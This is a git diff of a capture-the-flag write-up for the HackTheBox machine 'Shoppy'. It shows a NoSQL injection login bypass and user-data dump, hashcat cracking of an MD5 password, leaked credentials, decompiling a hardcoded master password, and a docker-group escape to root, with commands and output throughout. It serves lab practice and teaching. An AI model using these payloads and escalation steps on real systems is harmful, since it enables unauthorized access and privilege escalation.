@@ -5,7 +5,7 @@ tags:
 
 - Machine : https://app.hackthebox.com/machines/Shoppy
 - Reference : https://youtu.be/AJc53DUdt1M?si=cFusvG-9zN17S-Xs
-- Solved : 2024.11.26. (Tue) (Takes 1day)
+- Solved : 2024.11.27. (Wed) (Takes 2day)
 ---
 ## Summary
 
@@ -13,11 +13,11 @@ tags:
 
 
 ---
-# External Penetration Testing
----
-## External Information Gathering
+
+
+# Reconnaissance
 ### Port Scanning
----
+
 ```bash 
 ┌──(kali㉿kali)-[~/htb]
 └─$ ./port-scan.sh 10.10.11.180
@@ -77,7 +77,7 @@ The `nginx` version doesn't seem to be vulnerable yet based on `searchsploit`.
 Let's visit `http(80)` first.
 
 ### http(80)
----
+
 ![](attachments/shoppy_1.png)
 
 The first index page shows that the service is not open yet with timer.
@@ -174,10 +174,14 @@ ID           Response   Lines    Word       Chars       Payload
 `mattermost` is found here.
 As long as I know, mattermost is a chat application which can be hosted locally.
 
+### http(80) - Mattermost
+
 ![](attachments/shoppy_3.png)
 
 I tested this login input with sqli wordlist(`/usr/share/seclists/Fuzzing/SQLi/quick-sqli.txt`), but it doesn't seem working.
 Instead, let me try NoSQL Injection.
+
+##### NoSQL Injection
 
 Here are some references:
 https://book.hacktricks.xyz/pentesting-web/nosql-injection
@@ -211,4 +215,321 @@ The formula of this will be `False || True && False` => Which ends up being `Tru
 
 ![](attachments/shoppy_4.png)
 
-Now I can see the "Shoppy App" page.
+Now I can see the "Shoppy App" page. On its top right corner, there's `Search for users` menu.
+Let me click it.
+
+
+
+# Shell as  `jaeger`
+
+### Reuse NoSQL Injection
+
+![](attachments/shoppy_5.png)
+
+This shows an input tab for the user search, and once I type in any name, it shows "Download export".
+
+![](attachments/shoppy_6.png)
+
+If I click the button, it leads us to JSON page.
+Possibly it's using same DB and query logic(NoSQL) on its backend.
+So, let me try the same injection query : `admin' || '1' == '1`
+
+This will complete the query like the following;
+`'username'=='admin' || '1' == '1'`
+If it works, it will retrieve all existing user data.
+
+![](attachments/shoppy_7.png)
+
+With the injection query, I can find one more user : `josh`
+The information found of `josh` is as follows;
+
+```
+_id : "62db0e93d6d6a999a66ee67b"
+username : "josh"
+password : "6ebcea65320589ca4f2f1ce039975995"
+```
+
+```bash
+┌──(kali㉿kali)-[~/htb]
+└─$ hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt.gz 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================
+<SNIP>
+
+Dictionary cache building /usr/share/wordlists/rockyou.txt.gz: 33553434 bytDictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt.gz
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+6ebcea65320589ca4f2f1ce039975995:remembermethisway        
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 6ebcea65320589ca4f2f1ce039975995
+Time.Started.....: Wed Nov 27 08:44:35 2024 (1 sec)
+Time.Estimated...: Wed Nov 27 08:44:36 2024 (0 secs)
+<SNIP>
+```
+
+The cracked password is `remembermethisway`
+With this credential, let's try logging into mattermost as well.
+
+![](attachments/shoppy_8.png)
+
+In the mattermost app, I can find a chat that reveals a new credential: `jaeger` : `Sh0ppyBest@pp!`
+Since I couldn't find the username from previous user retrieval, I think I can use this credential to different service.. Maybe ssh(22)?
+
+Plus, `josh` says that `docker` will be deployed on the system. We might need to enumerate to find docker system after getting a shell.
+
+```bash
+┌──(kali㉿kali)-[~/htb]
+└─$ ssh jaeger@shoppy.htb
+The authenticity of host 'shoppy.htb (10.10.11.180)' can't be established.
+ED25519 key fingerprint is SHA256:RISsnnLs1eloK7XlOTr2TwStHh2R8hui07wd1iFyB+8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'shoppy.htb' (ED25519) to the list of known hosts.
+jaeger@shoppy.htb's password: 
+Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+jaeger@shoppy:~$ id
+uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
+jaeger@shoppy:~$ ls
+Desktop    Downloads  Pictures  ShoppyApp        Templates  Videos
+Documents  Music      Public    shoppy_start.sh  user.txt
+jaeger@shoppy:~$ cat user.txt
+bc438c29d7aed07637d4b4a2109c763e
+```
+
+The credential works, and I can get a shell.
+
+
+
+# Shell as `deploy`
+
+### Enumeration
+##### SUID
+```swift
+jaeger@shoppy:~$ find / -perm -4000 2>/dev/null
+/usr/sbin/pppd
+/usr/libexec/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/xorg/Xorg.wrap
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/ntfs-3g
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/fusermount3
+```
+
+Based on GTFOBins, there's no critical executables with sticky bit.
+##### sudo -l
+```bash
+jaeger@shoppy:~$ sudo -l
+[sudo] password for jaeger: 
+Matching Defaults entries for jaeger on shoppy:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jaeger may run the following commands on shoppy:
+    (deploy) /home/deploy/password-manager
+```
+
+##### Investigate binary
+
+There's an unusual executable named `password-manager`, which is deployed on `/home/deploy`.
+Probably, there's another user named `deploy` as we can guess from the directory name.
+
+```swift
+jaeger@shoppy:~$ file /home/deploy/password-manager
+/home/deploy/password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped
+```
+
+It's an ELF file which is executable.. With `strings` command, there's no useful information found.. Since there's no clue yet, let's just run it.
+
+```bash
+jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
+[sudo] password for jaeger: 
+Welcome to Josh password manager!
+Please enter your master password: test
+Access denied! This incident will be reported !
+```
+
+To extract password from the binary, let's use decompiler. I'm using online decompiler (`dogbolt.org`).
+
+```C++
+bool main(void)
+
+{
+  int iVar1;
+  ostream *poVar2;
+  string local_68 [32];
+  string local_48 [47];
+  allocator local_19 [9];
+  
+  poVar2 = std::operator<<((ostream *)std::cout,"Welcome to Josh password manager!");
+  std::ostream::operator<<(poVar2,std::endl<char,std::char_traits<char>>);
+  std::operator<<((ostream *)std::cout,"Please enter your master password: ");
+  std::string::string(local_48);
+  std::operator>>((istream *)std::cin,local_48);
+  std::allocator<char>::allocator();
+  std::string::string(local_68,"",local_19);
+  std::allocator<char>::~allocator((allocator<char> *)local_19);
+  std::string::operator+=(local_68,"S");
+  std::string::operator+=(local_68,"a");
+  std::string::operator+=(local_68,"m");
+  std::string::operator+=(local_68,"p");
+  std::string::operator+=(local_68,"l");
+  std::string::operator+=(local_68,"e");
+  iVar1 = std::string::compare(local_48);
+  if (iVar1 != 0) {
+    poVar2 = std::operator<<((ostream *)std::cout,"Access denied! This incident will be reported !")
+    ;
+    std::ostream::operator<<(poVar2,std::endl<char,std::char_traits<char>>);
+  }
+  else {
+    poVar2 = std::operator<<((ostream *)std::cout,"Access granted! Here is creds !");
+    std::ostream::operator<<(poVar2,std::endl<char,std::char_traits<char>>);
+    system("cat /home/deploy/creds.txt");
+  }
+  std::string::~string(local_68);
+  std::string::~string(local_48);
+  return iVar1 != 0;
+}
+```
+
+The decompiled code reveals that the master password is hardcoded as `Sample`. 
+The program compares the user input (`local_48`) with this password (`local_68`) using `std::string::compare`. 
+If the input matches `Sample`, access is granted, and it runs the command to display the credentials.
+This hardcoding makes it easy to extract the password and is a security flaw.
+
+```bash
+jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
+Welcome to Josh password manager!
+Please enter your master password: Sample
+Access granted! Here is creds !
+Deploy Creds :
+username: deploy
+password: Deploying@pp!
+```
+
+With the extracted password `Sample`, it reveals user `deploy`'s password : `Deploying@pp!`
+Let's move up to `deploy` using this credential through `su`
+
+```bash
+jaeger@shoppy:~$ su deploy
+Password: 
+$ whoami
+deploy
+$ id
+uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+```
+
+# Shell as `root`
+
+### Enumeration
+
+##### sudo -l & SUID
+
+```bash
+$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for deploy: 
+Sorry, user deploy may not run sudo on shoppy.
+
+$ find / -perm -4000 2>/dev/null
+/usr/sbin/pppd
+/usr/libexec/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/xorg/Xorg.wrap
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/ntfs-3g
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/fusermount3
+```
+
+I think it'd be better to have more deep investigation. So let's run `linpeas`.
+
+```bash
+deploy@shoppy:/tmp$ ./linpeas_linux_amd64 
+
+<SNIP>
+
+╔══════════╣ My user
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users   
+uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)   
+
+╔══════════╣ Superusers
+root:x:0:0:root:/root:/bin/bash                                            
+
+╔══════════╣ Users with console
+deploy:x:1001:1001::/home/deploy:/bin/sh                                   
+jaeger:x:1000:1000:jaeger,,,:/home/jaeger:/bin/bash
+mattermost:x:998:997::/home/mattermost:/bin/sh
+postgres:x:119:127:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+```
+
+The only useful information is that the current user `deploy` belong to `docker` group.
+Which means that the shell we have might be in `docker`.
+If so, we have to break out from `docker`.
+
+Here's an useful reference :
+<https://gtfobins.github.io/gtfobins/docker/>
+
+To break out exploiting `docker`, we have to run the following command;
+
+```bash
+deploy@shoppy:/tmp$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# whoami
+root
+
+# python3 -c 'import pty;pty.spawn("/bin/bash")'
+root@ad47c0200333:/# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+```
+
+Yeah, now I'm root!
+
+```bash
+root@ad47c0200333:/# cd /root
+root@ad47c0200333:~# ls
+root.txt
+root@ad47c0200333:~# cat root.txt
+832143b79887fd5a4bcbf099ce22055f
+```
